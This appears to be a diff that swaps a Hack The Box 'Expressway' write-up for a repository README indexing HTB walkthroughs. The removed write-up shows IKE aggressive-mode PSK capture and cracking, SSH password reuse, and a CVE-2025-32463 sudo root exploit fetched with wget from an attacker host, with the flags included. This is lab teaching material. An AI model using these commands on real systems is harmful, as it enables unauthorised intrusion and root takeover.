@@ -1,156 +1,131 @@
-# HTB Write-Up: Expressway
+<div align="center">
 
-| Field | Details |
-| --- | --- |
-| Platform | [Hack The Box](https://app.hackthebox.com/machines/Expressway) |
-| Difficulty | Easy |
-| OS | Linux |
-| Date | October 26, 2026 |
+# 🏴‍☠️ HTB WalkThroughs
 
-## Table of Contents
+**Hack The Box machine write-ups — from the first nmap scan to root.**
+Each one explains the *why* behind every step, not just the commands.
 
-1. [Reconnaissance](#reconnaissance)
-2. [Initial Access — IKE Aggressive Mode PSK Capture & Cracking](#initial-access-ike-aggressive-mode-psk-capture-cracking)
-3. [Shell Access — SSH Credential Reuse & User Flag](#shell-access-ssh-credential-reuse-user-flag)
-4. [Privilege Escalation — CVE-2025-32463 (sudo chroot)](#privilege-escalation-cve-2025-32463-sudo-chroot)
+<!-- BADGES:START -->
+<p align="center">
+<img src="https://img.shields.io/badge/Machines-33-58a6ff?style=for-the-badge&labelColor=161b22&logo=hackthebox&logoColor=white" alt="Machines: 33">
+<img src="https://img.shields.io/badge/Easy-14-9fef00?style=for-the-badge&labelColor=161b22" alt="Easy: 14">
+<img src="https://img.shields.io/badge/Medium-12-ffaf00?style=for-the-badge&labelColor=161b22" alt="Medium: 12">
+<img src="https://img.shields.io/badge/Hard-4-ff3e3e?style=for-the-badge&labelColor=161b22" alt="Hard: 4">
+<img src="https://img.shields.io/badge/Insane-0-a335ee?style=for-the-badge&labelColor=161b22" alt="Insane: 0"><br>
+<img src="https://img.shields.io/badge/Linux-7-f0883e?style=for-the-badge&labelColor=161b22" alt="Linux: 7">
+<img src="https://img.shields.io/badge/Windows-23-58a6ff?style=for-the-badge&labelColor=161b22" alt="Windows: 23">
+<img src="https://img.shields.io/badge/Latest-Delegate-238636?style=for-the-badge&labelColor=161b22" alt="Latest: Delegate">
+</p>
+<!-- BADGES:END -->
 
-## Reconnaissance
+</div>
 
-TCP port discovery was performed with **RustScan**:
+---
 
-```bash
-rustscan -a 10.129.238.52 --ulimit=5000
-```
+## 📊 At a glance
 
-```
-Open 10.129.238.52:22
-```
+<!-- STATS:START -->
+<p align="center"><img src="assets/stats.svg" alt="HTB progress card" width="820"></p>
 
-Only SSH on the TCP side — a minimal surface worth checking for UDP services too:
+| Difficulty | Machines | Share |
+|:--|:-:|:--|
+| 🟢 **Easy** | 14 | `▰▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱` 42% |
+| 🟠 **Medium** | 12 | `▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱` 36% |
+| 🔴 **Hard** | 4 | `▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱` 12% |
+| 🟣 **Insane** | 0 | `▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱` 0% |
+| ⚪ Unrated | 3 | `▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱` 9% |
+| **Total** | **33** | |
+<!-- STATS:END -->
 
-```bash
-sudo nmap -sU --top-port=50 10.129.238.52
-```
+## 🆕 Recently solved
 
-**Result:**
+<!-- RECENT:START -->
+| Machine | Difficulty | OS | Solved |
+|:--|:-:|:-:|:-:|
+| **[Delegate](Delegate/README.md)** | 🟠 Medium | 🪟 Windows | Oct 26, 2026 |
+| **[DarkZero](DarkZero/README.md)** | 🔴 Hard | 🪟 Windows | Oct 25, 2026 |
+| **[Devvortex](Devvortex/README.md)** | 🟢 Easy | 🐧 Linux | Oct 24, 2026 |
+| **[Voleur](Voleur/README.md)** | 🟠 Medium | 🪟 Windows | Oct 24, 2026 |
+| **[GoodGames](GoodGames/README.md)** | 🟢 Easy | 🐧 Linux | Oct 23, 2026 |
+<!-- RECENT:END -->
 
-```
-PORT     STATE         SERVICE
-68/udp   open|filtered dhcpc
-69/udp   open|filtered tftp
-139/udp  open|filtered netbios-ssn
-500/udp  open          isakmp
-4500/udp open|filtered nat-t-ike
-```
+## 🗂️ All write-ups
 
-**Port 500/udp (ISAKMP)** confirmed and open is the signal that matters — it means an **IPsec VPN gateway** is active on the host, and with no web service exposed, it's the obvious next target.
+> Click a difficulty to expand it. Newest first.
 
-## Initial Access — IKE Aggressive Mode PSK Capture & Cracking
+<!-- MACHINES:START -->
+<details>
+<summary><b>🟢 Easy</b> — 14 machines</summary>
 
-### 2.1 — Checking for Aggressive Mode
+| Machine | OS | Solved |
+|:--|:-:|:-:|
+| [Devvortex](Devvortex/README.md) | 🐧 Linux | Oct 24, 2026 |
+| [GoodGames](GoodGames/README.md) | 🐧 Linux | Oct 23, 2026 |
+| [Devel](Devel/README.md) | 🪟 Windows | Oct 20, 2026 |
+| [Driver](Driver/README.md) | 🪟 Windows | Oct 19, 2026 |
+| [Sau](Sau/README.md) | 🐧 Linux | Oct 19, 2026 |
+| [Support](Support/README.md) | 🪟 Windows | Oct 5, 2026 |
+| [Touch](Touch/README.md) | 🪟 Windows | Oct 5, 2026 |
+| [Fluffy](Fluffy/README.md) | 🪟 Windows | Jun 28, 2026 |
+| [Sauna](Sauna/README.md) | 🪟 Windows | Jun 19, 2026 |
+| [Bounty](Bounty/bounty.md) | 🪟 Windows | May 3, 2026 |
+| [Active](Active/active.md) | 🪟 Windows | Apr 30, 2026 |
+| [Baby](Baby/baby.md) | 🪟 Windows | Apr 30, 2026 |
+| [Forest](Forest/forest.md) | 🪟 Windows | Apr 30, 2026 |
+| [Traverxec](Traverxec/traverxec.md) | 🐧 Linux | Apr 30, 2026 |
 
-**IKEv1 Aggressive Mode** is a legacy negotiation mode with a well-known weakness: when a client connects, the server sends its PSK authentication hash before the client has proven its identity — exposing that hash to anyone who asks. **ike-scan** was used to check whether the gateway supports it:
+</details>
 
-```bash
-ike-scan --aggressive --trans=5,2,1,2 10.129.238.52
-```
+<details>
+<summary><b>🟠 Medium</b> — 12 machines</summary>
 
-**Result:**
+| Machine | OS | Solved |
+|:--|:-:|:-:|
+| [Delegate](Delegate/README.md) | 🪟 Windows | Oct 26, 2026 |
+| [Voleur](Voleur/README.md) | 🪟 Windows | Oct 24, 2026 |
+| [Logging](Logging/README.md) | 🪟 Windows | Oct 23, 2026 |
+| [Overwatch](Overwatch/README.md) | 🪟 Windows | Oct 21, 2026 |
+| [Administrator](Administrator/README.md) | 🪟 Windows | Oct 20, 2026 |
+| [Layover](Layover/README.md) | 🐧 Linux | Oct 7, 2026 |
+| [Jeeves](Jeeves/README.md) | 🪟 Windows | Jul 5, 2026 |
+| [Escape](Escape/README.md) | 🪟 Windows | Jun 25, 2026 |
+| [Certified](Certified/README.md) | 🪟 Windows | Jun 8, 2026 |
+| [DevHub](DevHub/README.md) | 🐧 Linux | Jun 1, 2026 |
+| [Cicada](Cicada/cicada.md) | 🪟 Windows | May 24, 2026 |
+| [Cronos](Cronos/cronos.md) | 🐧 Linux | Apr 30, 2026 |
 
-```
-Aggressive Mode Handshake returned HDR=(...) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=... (XAUTH) ...
-```
+</details>
 
-The server responded, confirming Aggressive Mode is supported and leaking two useful details: the identity string **`ike@expressway.htb`**, and a flag indicating **XAUTH** is also required — meaning an individual username and password will be needed later, on top of the group PSK.
+<details>
+<summary><b>🔴 Hard</b> — 4 machines</summary>
 
-### 2.2 — Capturing the PSK Hash
+| Machine | OS | Solved |
+|:--|:-:|:-:|
+| [DarkZero](DarkZero/README.md) | 🪟 Windows | Oct 25, 2026 |
+| [TombWatcher](TombWatcher/README.md) | 🪟 Windows | Jul 6, 2026 |
+| [Garfield](Garfield/README.md) | 🪟 Windows | Jun 28, 2026 |
+| [Blackfield](Blackfield/README.md) | 🪟 Windows | Jun 19, 2026 |
 
-With the identity known, the same scan was repeated, this time capturing the server's authentication hash to a file instead of just displaying the handshake:
+</details>
 
-```bash
-ike-scan --aggressive --trans=5,2,1,2 --id=ike@expressway.htb -P vpn_hash.txt 10.129.238.52
-```
+<details>
+<summary><b>⚪ Unrated</b> — 3 machines</summary>
 
-The PSK parameters came back as a long colon-separated string — the cryptographic material needed to crack the Pre-Shared Key offline, since guessing directly against the server would trigger blocking or rate-limiting.
+| Machine | OS | Solved |
+|:--|:-:|:-:|
+| [Stream](Stream/README.md) | — | Oct 15, 2026 |
+| [Kobold](Kobold/kobold.md) | — | Apr 30, 2026 |
+| [WingData](WingData/wingdata.md) | — | Apr 30, 2026 |
 
-### 2.3 — Cracking the PSK
+</details>
+<!-- MACHINES:END -->
 
-The captured hash was saved and run through **Hashcat** against rockyou:
+## 🧭 How every write-up is structured
 
-```bash
-hashcat -m 5400 hash /usr/share/wordlists/rockyou.txt
-```
+| | Phase | What you'll find |
+|:-:|:--|:--|
+| 1️⃣ | **Recon** | Port scans, service and web enumeration |
+| 2️⃣ | **Foothold** | The vulnerability, the exploit, the first shell |
+| 3️⃣ | **Privilege escalation** | Local enumeration → root / SYSTEM / Domain Admin |
+| 4️⃣ | **Takeaways** | What I learned, plus detection and mitigation ideas |
 
-**Result:**
-
-```
-Status...........: Cracked
-...freakingrockstarontheroad
-```
-
-Recovered Group Pre-Shared Key: **`freakingrockstarontheroad`**.
-
-## Shell Access — SSH Credential Reuse & User Flag
-
-With no web service exposed and only SSH open on TCP, the cracked PSK was worth trying there directly. The leaked identity from the IKE handshake, `ike@expressway.htb`, hinted strongly that a local account named **`ike`** exists on the host:
-
-```bash
-ssh ike@10.129.238.52
-# Password: freakingrockstarontheroad
-```
-
-It worked — whoever configured the VPN reused the same Group PSK as the login password for the `ike` Linux account, letting a credential captured at the network layer (IPsec) carry straight over to the management layer (SSH).
-
-```bash
-ike@expressway:~$ cat user.txt
-07253c9ae25074a4facb41e95564dbf4
-```
-
-## Privilege Escalation — CVE-2025-32463 (sudo chroot)
-
-### 4.1 — Checking Sudo Rights
-
-```bash
-sudo -l
-# Sorry, user ike may not run sudo on expressway.
-```
-
-No explicit sudo rule, but the installed **sudo version** itself turned out to be the path forward:
-
-```bash
-sudo --version
-```
-
-```
-Sudo version 1.9.17
-```
-
-This version is vulnerable to **CVE-2025-32463** — a flaw in how sudo handles the `--chroot` option that lets a local user trick sudo into loading an attacker-controlled configuration from within a fake root, resulting in arbitrary command execution as root, with no sudo rule required.
-
-### 4.2 — Running the Exploit
-
-A public PoC was fetched and served to the target:
-
-```bash
-git clone https://github.com/kh4sh3i/CVE-2025-32463.git
-cd CVE-2025-32463
-python3 -m http.server 80
-```
-
-```bash
-ike@expressway:/tmp$ wget 10.10.14.25/exploit.sh
-ike@expressway:/tmp$ chmod +x exploit.sh
-ike@expressway:/tmp$ ./exploit.sh
-```
-
-```
-woot!
-root@expressway:/#
-```
-
-### 4.3 — Root Flag
-
-```bash
-root@expressway:/root# cat root.txt
-fedc43519c5d545a4b65da957d9cd01d
-```
